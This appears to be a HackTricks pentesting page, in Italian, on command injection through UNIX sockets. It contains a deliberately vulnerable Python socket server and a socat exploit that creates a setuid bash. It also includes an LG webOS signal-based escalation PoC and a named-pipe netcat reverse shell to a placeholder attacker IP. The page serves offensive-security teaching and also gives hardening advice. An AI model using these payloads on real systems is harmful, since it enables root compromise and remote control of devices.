# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Esempio di socket binding con Python

Nell'esempio seguente viene creato un **unix socket** (`/tmp/socket_test.s`) e tutto ciò che viene **ricevuto** verrà **eseguito** da `os.system`. So che non troverai questo scenario in the wild, ma lo scopo di questo esempio è mostrare come appare il codice che utilizza unix socket e come gestire l'input nel caso peggiore possibile.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Esegui** il codice usando python: `python s.py` e **controlla come è in ascolto il socket**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Caso di studio: escalation tramite socket UNIX di proprietà di root attivata da un signal (LG webOS)

Alcuni daemon privilegiati espongono un socket UNIX di proprietà di root che accetta input non attendibile e associa le azioni privilegiate a thread-ID e signal. Se il protocollo consente a un client non privilegiato di influenzare quale thread nativo venga preso di mira, potrebbe essere possibile attivare un percorso di codice privilegiato ed effettuare un'escalation.<sup>[[1]](#references)</sup>

Pattern osservato:
- Connettersi a un socket di proprietà di root (ad esempio, /tmp/remotelogger).
- Creare un thread e ottenere il suo thread id nativo (TID).
- Inviare il TID (packed) più il padding come request; ricevere un acknowledgement.
- Inviare un signal specifico a quel TID per attivare il comportamento privilegiato.

Schema PoC minimo:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Per trasformare questo in una root shell, si può usare un semplice pattern named-pipe + nc:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Note:
- Questa classe di bug deriva dal fatto che ci si fida di valori derivati dallo stato del client non privilegiato (TID), associandoli a signal handler o logica privilegiati.
- Rafforzare la sicurezza imponendo l'autenticazione sul socket, convalidando i formati dei messaggi e separando le operazioni privilegiate dagli identificatori dei thread forniti esternamente.

## References

- [1] [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
